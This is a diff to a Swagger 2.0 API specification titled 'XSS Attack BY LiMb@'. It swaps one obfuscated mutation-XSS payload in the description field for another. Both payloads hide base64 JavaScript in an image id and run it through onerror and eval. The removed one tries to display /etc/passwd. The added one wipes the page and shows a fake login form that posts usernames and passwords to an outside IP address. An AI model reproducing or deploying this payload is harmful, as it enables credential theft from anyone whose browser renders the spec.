@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY LiMb@
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7PGltZyBzcmM9Inhhc2Rhc2Rhc2QiIG9uZXJyb3I9ImFsZXJ0KGRvY3VtZW50LndyaXRlKCc8aWZyYW1lIHNyYz1maWxlOi8vL2V0Yy9wYXNzd2Q+PC9pZnJhbWU+JykpIi8+OyA=' onerror='eval(atob(this.id))'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzthLmFjdGlvbj0naHR0cDovLzE2OC4xMTkuMTY3LjEwMToxMzM3JzthLmlubmVySFRNTD0nPGNlbnRlcj48YnI+VXNlcm5hbWU6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSI+PGJyPlBhc3N3b3JkOiA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9cHdkPjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPjwvY2VudGVyPic7IGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror='eval(atob(this.id))'>"></form>
 
           format: int64
           in: path
